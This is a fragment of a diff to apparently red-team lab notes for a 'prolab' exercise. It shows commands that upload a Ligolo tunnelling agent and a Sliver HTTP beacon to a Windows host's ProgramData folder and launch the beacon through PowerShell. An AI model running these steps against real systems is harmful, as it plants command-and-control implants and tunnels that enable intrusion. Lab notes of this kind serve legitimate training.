@@ -145,8 +145,10 @@ upload /home/kali/work/prolab/ligolo/ligolo-windows-agent.exe C:\\ProgramData\\l
 upload /home/kali/work/prolab/sliver/httpbeacon80fast.exe C:\\ProgramData\\fast.exe
 
 # Execute that Beacon
-execute `powershell.exe -Command "Start-Process C:\\ProgramData\\fast.exe"`
+sliver > execute powershell.exe -Command "Start-Process C:\\ProgramData\\fast2.exe"
 # Run a command
+
+# Spawn an
 
 ```
 ## Cheatsheet
